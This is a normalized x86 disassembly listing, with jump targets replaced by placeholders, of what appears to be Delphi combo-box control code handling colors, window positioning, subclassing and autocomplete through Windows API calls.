call sub_44e6f0
test al al
je r-xdata
sub eax 0xfb
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x50 ] 0x80
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
dec eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_44029c
test al al
je r-xdata
sub eax 0x7
je r-xdata
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov ecx ebx
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_469564
jmp r-xdata
sub eax 0x5
je r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffe9
call sub_403564
dec eax
je r-xdata
mov [ ebx + 0xc ] 0x4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_45fd40
mov edi eax
test edi edi
je r-xdata
dec eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_43f128
test al al
je r-xdata
jmp r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44e7b8
test al al
je r-xdata
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0xe8 ]
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x54 ] 0x20
je r-xdata
sub eax 0x7c
je r-xdata
movsx eax [ ebx + 0x8 ]
mov [ ebp - 0xc ] eax
movsx eax [ ebx + 0xa ]
mov [ ebp - 0x8 ] eax
push 0x1
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x4 ]
call sub_44f7b4
push eax
push esi
call MapWindowPoints
mov ax [ ebp - 0xc ]
mov [ ebx + 0x8 ] ax
mov ax [ ebp - 0x8 ]
mov [ ebx + 0xa ] ax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x74 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov di [ ebx + 0x4 ]
cmp di 0xd
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_44029c
test al al
je r-xdata
cmp di 0x1b
jne r-xdata
mov [ ebx + 0xc ] 0xffffffff
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_4402c0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_440888
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ esi ]
sub eax 0x5
je r-xdata
mov edi [ esi ]
cmp edi 0x201
je r-xdata
cmp [ ebx + 0x25c ] 0x0
je r-xdata
sub eax 0xfd
je r-xdata
mov eax ebx
call sub_44973c
test al al
jne r-xdata
cmp edi 0x203
jne r-xdata
mov edx esi
mov eax ebx
call sub_44d1c8
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
jmp r-xdata
mov edx esi
mov eax ebx
call sub_44e7b8
test al al
jne r-xdata
add eax 0xffffffd0
sub eax 0x7
jb r-xdata
cmp [ ebx + 0x5d ] 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov di [ esi + 0x4 ]
cmp di 0xd
je r-xdata
mov eax [ ebx + 0x68 ]
mov eax [ eax + 0x18 ]
call sub_423d18
push eax
mov eax [ esi + 0x4 ]
push eax
call SetTextColor
mov eax [ ebx + 0x170 ]
call sub_42499c
call sub_423d18
push eax
mov eax [ esi + 0x4 ]
push eax
call SetBkColor
mov eax [ ebx + 0x170 ]
call sub_4249d8
mov [ esi + 0xc ] eax
jmp r-xdata
jmp r-xdata
mov edx esi
mov eax ebx
call sub_44d134
test al al
jne r-xdata
mov eax ebx
call sub_44029c
test al al
je r-xdata
cmp di 0x1b
jne r-xdata
mov ax [ r-xdata ]
or ax [ ebx + 0x54 ]
mov [ ebx + 0x54 ] ax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x14 ]
jmp r-xdata
xor edx edx
mov eax ebx
call sub_4402c0
jmp r-xdata
sub_4409b4
cmp eax 0x8
ja r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_440afb
lea eax [ ebp - 0x4 ]
call sub_404164
retn
jmp [ eax * 4 + jump_table_4409c4 ]
mov eax edi
mov si 0xffe9
call sub_403564
jmp r-xdata
mov eax edi
mov si 0xffb3
call sub_403564
jmp r-xdata
mov [ edi + 0x25d ] 0x0
mov eax edi
mov si 0xffb1
call sub_403564
mov eax edi
mov edx [ eax ]
call [ edx + 0xf0 ]
cmp [ edi + 0x25d ] 0x0
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0xcc ]
mov edx eax
lea ecx [ ebp - 0x4 ]
mov eax [ edi + 0x23c ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_448fe4
mov eax edi
mov si 0xffeb
call sub_403564
mov eax edi
mov si 0xffb2
call sub_403564
jmp r-xdata
mov eax edi
mov si 0xffb0
call sub_403564
jmp r-xdata
mov [ edi + 0x25e ] 0x1
mov [ edi + 0x25d ] 0x1
mov eax edi
call sub_44df38
jmp r-xdata
mov [ edi + 0x25e ] 0x0
mov [ edi + 0x25d ] 0x1
mov eax edi
call sub_44e024
push 0x0
push 0x0
push 0x1f
mov eax edi
call sub_44f7b4
push eax
call PostMessageA
cmp [ edi + 0x25e ] 0x0
jne r-xdata
push 0x0
push 0x0
push 0x14f
mov eax edi
call sub_44f7b4
push eax
call PostMessageA
jmp r-xdata
sub_440b28
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x14 ] ebx
mov esi ecx
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_440bd1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x208 ]
call sub_447b80
cmp [ ebx + 0x282 ] 0x0
je r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ ebx + 0x208 ]
call sub_424d48
test esi esi
jl r-xdata
lea eax [ ebp - 0x10 ]
push eax
mov ax [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x284 ]
call [ ebx + 0x280 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_440bd8
lea eax [ ebp - 0x14 ]
call sub_404164
retn
lea ecx [ ebp - 0x14 ]
mov edx esi
mov eax [ ebx + 0x23c ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0x14 ]
push eax
mov edx [ ebp - 0x10 ]
add edx 0x2
mov ecx [ ebp - 0xc ]
mov eax [ ebx + 0x208 ]
call sub_424efc
sub_440c04
push esi
push edi
mov esi eax
mov eax esi
call sub_44b088
mov edi [ esi + 0x214 ]
cmp edi 0xffffffff
je r-xdata
pop edi
pop esi
retn
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xd0 ]
sub_440c2c
push ebx
push esi
mov esi eax
xor ebx ebx
mov eax esi
call sub_44fab8
test al al
je r-xdata
mov eax ebx
pop esi
pop ebx
retn
call GetFocus
cmp eax [ esi + 0x240 ]
je r-xdata
mov bl 0x1
cmp eax [ esi + 0x244 ]
je r-xdata
xor ebx ebx
jmp r-xdata
sub_440c80
push ebx
push esi
cmp [ eax + 0x222 ] 0x0
je r-xdata
mov si 0xffb3
call sub_403564
pop esi
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x224 ]
call [ ebx + 0x220 ]
pop esi
pop ebx
retn
sub_440cac
push ebx
mov ebx eax
mov eax ebx
call sub_44c76c
push 0x0
mov eax [ ebx + 0x20c ]
push eax
push 0x141
mov eax ebx
call sub_44f7b4
push eax
call SendMessageA
xor eax eax
mov [ ebx + 0x240 ] eax
xor eax eax
mov [ ebx + 0x244 ] eax
pop ebx
retn
sub_440ce4
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x104 ]
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x210 ]
cmp ebx eax
jle r-xdata
cmp ebx 0x1
jge r-xdata
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x25c ] 0x1
xor eax eax
push ebp
push sub_440d7a
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x9e
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xfc ]
imul ebx
mov edx [ ebp - 0x4 ]
add eax [ edx + 0x4c ]
add eax 0x2
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
push eax
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x248 ]
push eax
call SetWindowPos
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_440d81
mov eax [ ebp - 0x4 ]
mov [ eax + 0x25c ] 0x0
retn
mov ebx 0x1
sub_440d81
push 0x5f
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x248 ]
push eax
call SetWindowPos
pop ebx
pop ecx
pop ebp
retn
sub_440da0
push esi
push edi
mov esi eax
mov edi [ esi + 0x23c ]
test edi edi
je r-xdata
mov [ esi + 0x23c ] edx
pop edi
pop esi
retn
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop edi
pop esi
retn
sub_440dd0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_440e4f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
inc eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_440e56
lea eax [ ebp - 0x4 ]
call sub_404164
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
mov edx eax
lea ecx [ ebp - 0x4 ]
mov eax [ ebx + 0x23c ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x4 ]
push eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
mov edx eax
mov eax [ ebx + 0x23c ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx eax
mov eax esi
pop edx
mov ebx [ eax ]
call [ ebx + 0xd4 ]
sub_440e5c
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
inc eax
je r-xdata
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
mov edx eax
mov eax [ ebx + 0x23c ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
sub_440e9c
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_404614
xor eax eax
push ebp
push sub_440ee5
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx esi
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x23c ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_440eec
lea eax [ ebp - 0x4 ]
call sub_404164
retn
sub_440ef4
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_4400dc
mov eax ebx
mov edx [ eax ]
call [ edx + 0xf8 ]
mov dl 0x1
call sub_403338
mov esi eax
mov [ ebx + 0x23c ] esi
mov [ esi + 0x10 ] ebx
mov [ ebx + 0x238 ] 0x10
mov [ ebx + 0x276 ] 0x0
xor eax eax
mov [ ebx + 0x26c ] eax
mov [ ebx + 0x268 ] 0x1
mov [ ebx + 0x290 ] 0x0
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4036b4
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_40370c
pop [ fs : 0x0 ]
add esp 0xc
sub_440f78
push ebx
push esi
call sub_40371c
mov ebx edx
mov esi eax
mov eax [ esi + 0x23c ]
call sub_403368
mov eax [ esi + 0x278 ]
call sub_403368
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4401d0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403704
sub_440fc8
push ebx
mov ebx eax
cmp dl [ ebx + 0x276 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x276 ] dl
cmp dl 0x1
jne r-xdata
mov eax [ r-xdata ]
or eax [ ebx + 0x50 ]
mov [ ebx + 0x50 ] eax
mov eax [ r-xdata ]
not eax
and eax [ ebx + 0x50 ]
mov [ ebx + 0x50 ] eax
jmp r-xdata
mov eax ebx
call sub_44cd54
sub_44102c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44c640
mov ecx r-xdata
mov edx esi
mov eax ebx
call sub_44c56c
mov eax [ esi + 0x4 ]
or eax 0x200240
xor edx edx
mov dl [ ebx + 0x276 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x275 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x274 ]
or eax [ edx * 4 + rw-data ]
mov [ esi + 0x4 ] eax
pop esi
pop ebx
retn
sub_44108d
add [ eax ] al
add [ ebx + 0x56 ] dl
push edi
mov ebx eax
mov eax ebx
call sub_440cac
mov eax ebx
call sub_44f7b4
mov [ ebx + 0x248 ] eax
mov esi [ ebx + 0x278 ]
test esi esi
je r-xdata
mov al [ ebx + 0x276 ]
sub al 0x2
jae r-xdata
mov edx esi
mov eax [ ebx + 0x23c ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebx + 0x278 ]
call sub_403368
xor eax eax
mov [ ebx + 0x278 ] eax
cmp [ ebx + 0x260 ] 0xffffffff
je r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
push 0x5
mov eax ebx
call sub_44f7b4
push eax
call GetWindow
mov esi eax
test esi esi
je r-xdata
mov eax [ ebx + 0x23c ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp eax [ ebx + 0x260 ]
jge r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x240 ] 0x0
je r-xdata
cmp [ ebx + 0x276 ] 0x1
jne r-xdata
push 0x0
mov eax [ ebx + 0x260 ]
push eax
push 0x14e
mov eax ebx
call sub_44f7b4
push eax
call SendMessageA
mov eax [ ebx + 0x23c ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov [ ebx + 0x260 ] eax
push 0x0
push 0x3
push 0xd3
mov eax [ ebx + 0x240 ]
push eax
call SendMessageA
mov edi esi
mov [ ebx + 0x240 ] edi
push 0xfffffffc
push edi
call GetWindowLongA
mov [ ebx + 0x250 ] eax
mov eax [ ebx + 0x24c ]
push eax
push 0xfffffffc
mov eax [ ebx + 0x240 ]
push eax
call SetWindowLongA
mov edi esi
mov [ ebx + 0x244 ] edi
push 0xfffffffc
push edi
call GetWindowLongA
mov [ ebx + 0x258 ] eax
mov eax [ ebx + 0x254 ]
push eax
push 0xfffffffc
mov eax [ ebx + 0x244 ]
push eax
call SetWindowLongA
push 0x2
push esi
call GetWindow
mov esi eax
sub_4411d0
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x23c ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jle r-xdata
mov eax ebx
call sub_44cb50
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
mov [ ebx + 0x260 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403338
mov esi eax
mov [ ebx + 0x278 ] esi
mov edx [ ebx + 0x23c ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x8 ]
sub_441220
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
cmp [ ebx + 0x276 ] 0x1
jne r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x170 ]
call sub_4249d8
push eax
lea edx [ esp + 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x4 ]
push eax
mov eax [ esi + 0x4 ]
push eax
call FillRect
mov [ esi + 0xc ] 0x1
jmp r-xdata
add esp 0x10
pop esi
pop ebx
retn
sub_441274
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
push esi
push ebx
push 0x140
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_44f7b4
push eax
call SendMessageA
mov eax [ esi ]
cmp eax [ ebx ]
seta al
pop esi
pop ebx
pop ebp
retn
sub_4412a0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
xor eax eax
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_44135c
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_448fb4
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
push 0x140
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_44f7b4
push eax
call SendMessageA
mov ecx [ ebp - 0x8 ]
sub ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
inc edx
lea eax [ ebp - 0xc ]
call sub_4046c4
push 0x0
push 0xffffffff
push 0x14e
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_44f7b4
push eax
call SendMessageA
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0xc ]
call sub_448fe4
mov bx [ ebp - 0x4 ]
mov edx ebx
mov eax ebx
call sub_406e7c
push eax
push 0x0
push 0x142
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_44f7b4
push eax
call SendMessageA
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_441363
lea eax [ ebp - 0xc ]
call sub_404164
retn
sub_441368
push ebp
mov ebp esp
mov ecx 0xb
push 0x0
push 0x0
dec ecx
jne r-xdata
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_441720
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44e798
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x268 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_441727
lea eax [ ebp - 0x58 ]
mov edx 0x5
call sub_404188
lea eax [ ebp - 0x44 ]
call sub_404164
lea eax [ ebp - 0x40 ]
mov edx 0x2
call sub_404188
lea eax [ ebp - 0x38 ]
mov edx 0x2
call sub_404188
lea eax [ ebp - 0x14 ]
mov edx 0x2
call sub_404188
retn
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x276 ]
sub al 0x2
jae r-xdata
call GetTickCount
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x26c ]
cmp eax 0x1f4
jb r-xdata
lea edx [ ebp - 0x34 ]
mov eax [ ebp - 0x4 ]
call sub_448fb4
mov edx [ ebp - 0x34 ]
mov eax [ ebp - 0x4 ]
add eax 0x270
call sub_4041b8
jmp r-xdata
call GetTickCount
mov edx [ ebp - 0x4 ]
mov [ edx + 0x26c ] eax
mov eax [ ebp - 0x4 ]
add eax 0x270
call sub_404164
mov al [ ebx ]
sub al 0x8
je r-xdata
push ebp
lea edx [ ebp - 0xc ]
lea eax [ ebp - 0x8 ]
call sub_441274
pop ecx
test al al
je r-xdata
dec al
je r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x276 ]
sub al 0x2
jae r-xdata
push ebp
call sub_4412a0
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x269 ] 0x0
je r-xdata
sub al 0x12
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
call sub_404424
mov edx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
call sub_40c4f0
cmp al 0x2
je r-xdata
lea edx [ ebp - 0x38 ]
mov eax [ ebp - 0x4 ]
call sub_448fb4
mov eax [ ebp - 0x38 ]
call sub_404424
test eax eax
jle r-xdata
mov [ ebx ] 0x0
mov eax [ ebp - 0x4 ]
mov si 0xffb3
call sub_403564
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_44029c
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x269 ] 0x0
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
call sub_404424
mov edx eax
mov eax [ ebp - 0x4 ]
add eax 0x270
mov ecx 0x1
call sub_4046c4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
call sub_404424
mov edx eax
mov eax [ ebp - 0x4 ]
add eax 0x270
mov ecx 0x1
call sub_4046c4
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_448fb4
mov esi [ ebp - 0x8 ]
jmp r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_4402c0
jmp r-xdata
push ebp
lea edx [ ebp - 0xc ]
lea eax [ ebp - 0x8 ]
call sub_441274
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_44029c
test al al
jne r-xdata
mov edx esi
mov eax [ ebp - 0x14 ]
call sub_40c4f0
cmp al 0x2
je r-xdata
lea eax [ ebp - 0x50 ]
mov dl [ ebx ]
call sub_40434c
mov ecx [ ebp - 0x50 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x270 ]
lea eax [ ebp - 0x14 ]
call sub_404470
lea eax [ ebp - 0x48 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
mov ecx [ ebp - 0x8 ]
mov edx 0x1
call sub_404684
mov eax [ ebp - 0x48 ]
push eax
lea eax [ ebp - 0x4c ]
mov dl [ ebx ]
call sub_40434c
mov ecx [ ebp - 0x4c ]
lea eax [ ebp - 0x14 ]
pop edx
call sub_404470
jmp r-xdata
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_4402c0
dec esi
lea eax [ ebp - 0x10 ]
push eax
mov ecx esi
dec ecx
mov edx 0x1
mov eax [ ebp - 0x14 ]
call sub_404684
push 0x0
push 0xffffffff
push 0x14e
mov eax [ ebp - 0x4 ]
call sub_44f7b4
push eax
call SendMessageA
lea eax [ ebp - 0x40 ]
push eax
mov edx [ ebp - 0xc ]
inc edx
mov ecx 0x7fffffff
mov eax [ ebp - 0x14 ]
call sub_404684
mov ecx [ ebp - 0x40 ]
lea eax [ ebp - 0x3c ]
mov edx [ ebp - 0x10 ]
call sub_404470
mov edx [ ebp - 0x3c ]
mov eax [ ebp - 0x4 ]
call sub_448fe4
mov edi esi
dec edi
mov edx edi
mov eax edi
call sub_406e7c
push eax
push 0x0
push 0x142
mov eax [ ebp - 0x4 ]
call sub_44f7b4
push eax
call SendMessageA
lea edx [ ebp - 0x44 ]
mov eax [ ebp - 0x4 ]
call sub_448fb4
mov edx [ ebp - 0x44 ]
mov eax [ ebp - 0x4 ]
add eax 0x270
call sub_4041b8
jmp r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_441730
test al al
je r-xdata
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_44f7b4
push eax
lea eax [ ebp - 0x30 ]
push eax
call PeekMessageA
test eax eax
je r-xdata
mov al [ ebx ]
mov edx [ rw-data ]
and eax 0xff
bt [ edx ] eax
jae r-xdata
mov [ ebx ] 0x0
cmp [ ebp - 0x2c ] 0x102
jne r-xdata
lea eax [ ebp - 0x58 ]
mov dl [ ebp - 0x28 ]
call sub_40434c
mov ecx [ ebp - 0x58 ]
lea eax [ ebp - 0x54 ]
mov edx [ ebp - 0x14 ]
call sub_404470
mov edx [ ebp - 0x54 ]
mov eax [ ebp - 0x4 ]
call sub_441730
test al al
je r-xdata
push 0x1
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_44f7b4
push eax
lea eax [ ebp - 0x30 ]
push eax
call PeekMessageA
mov [ ebx ] 0x0
jmp r-xdata
sub_441730
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4418e5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_404424
test eax eax
jne r-xdata
mov eax esi
call sub_404624
push eax
push 0xffffffff
push 0x14c
mov eax ebx
call sub_44f7b4
push eax
call SendMessageA
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0xffffffff
setne [ ebp - 0x1 ]
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov [ ebp - 0x1 ] 0x0
or edx 0xffffffff
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xd0 ]
mov eax ebx
mov si 0xffb3
call sub_403564
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4418ec
lea eax [ ebp - 0x1c ]
call sub_404164
lea eax [ ebp - 0x18 ]
mov edx 0x3
call sub_404188
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
cmp eax [ ebp - 0x8 ]
setne [ ebp - 0x9 ]
cmp [ ebx + 0x290 ] 0x0
je r-xdata
push 0x0
mov eax [ ebp - 0x8 ]
push eax
push 0x14e
mov eax ebx
call sub_44f7b4
push eax
call SendMessageA
mov al [ ebx + 0x276 ]
sub al 0x2
jae r-xdata
mov edx esi
mov eax [ ebx + 0x23c ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
inc eax
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xd0 ]
lea eax [ ebx + 0x270 ]
mov edx esi
call sub_4041b8
lea eax [ ebp - 0x14 ]
push eax
lea ecx [ ebp - 0x18 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebx + 0x23c ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x18 ]
push eax
mov eax esi
call sub_404424
mov edx eax
inc edx
mov ecx 0x7fffffff
pop eax
call sub_404684
mov ecx [ ebp - 0x14 ]
lea eax [ ebp - 0x10 ]
mov edx esi
call sub_404470
mov edx [ ebp - 0x10 ]
mov eax ebx
call sub_448fe4
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_448fb4
mov eax [ ebp - 0x1c ]
call sub_404424
push eax
mov eax esi
call sub_404424
pop edx
call sub_406e7c
push eax
push 0x0
push 0x142
mov eax ebx
call sub_44f7b4
push eax
call SendMessageA
jmp r-xdata
push 0x0
push 0x0
push 0x14f
mov eax ebx
call sub_44f7b4
push eax
call SendMessageA
mov eax ebx
mov si 0xffeb
call sub_403564
mov eax ebx
mov si 0xffb2
call sub_403564
cmp [ ebp - 0x9 ] 0x0
je r-xdata
sub_441918
push ebx
push esi
push edi
push ebp
mov esi eax
mov ebx [ edx + 0x8 ]
mov di [ ebx + 0x10 ]
mov ebp [ ebx + 0x10 ]
test ebp 0x1000
je r-xdata
test ebp 0x20
je r-xdata
or di 0x1000
mov edx [ ebx + 0x18 ]
mov eax [ esi + 0x208 ]
call sub_4251ec
mov edx [ esi + 0x68 ]
mov eax [ esi + 0x208 ]
call sub_42508c
mov edx [ esi + 0x170 ]
mov eax [ esi + 0x208 ]
call sub_4250a8
cmp [ ebx + 0x8 ] 0x0
jl r-xdata
or di 0x20
mov ebp [ ebx + 0x8 ]
test ebp ebp
jl r-xdata
test di 0x1
je r-xdata
lea edx [ ebx + 0x1c ]
mov eax [ esi + 0x208 ]
call sub_424d48
push edi
lea ecx [ ebx + 0x1c ]
mov edx ebp
mov eax esi
mov ebp [ eax ]
call [ ebp + 0x110 ]
jmp r-xdata
mov eax [ esi + 0x208 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000d
call sub_4249a4
mov eax [ esi + 0x208 ]
mov eax [ eax + 0xc ]
mov edx 0xff00000e
call sub_4241d8
xor edx edx
mov eax [ esi + 0x208 ]
call sub_4251ec
pop ebp
pop edi
pop esi
pop ebx
retn
lea eax [ ebx + 0x1c ]
push eax
mov eax [ ebx + 0x18 ]
push eax
call DrawFocusRect
test di 0x10
je r-xdata
sub_4419f0
push ebx
push esi
mov esi eax
mov eax [ edx + 0x8 ]
mov edx [ esi + 0x238 ]
mov [ eax + 0x10 ] edx
cmp [ esi + 0x276 ] 0x4
jne r-xdata
pop esi
pop ebx
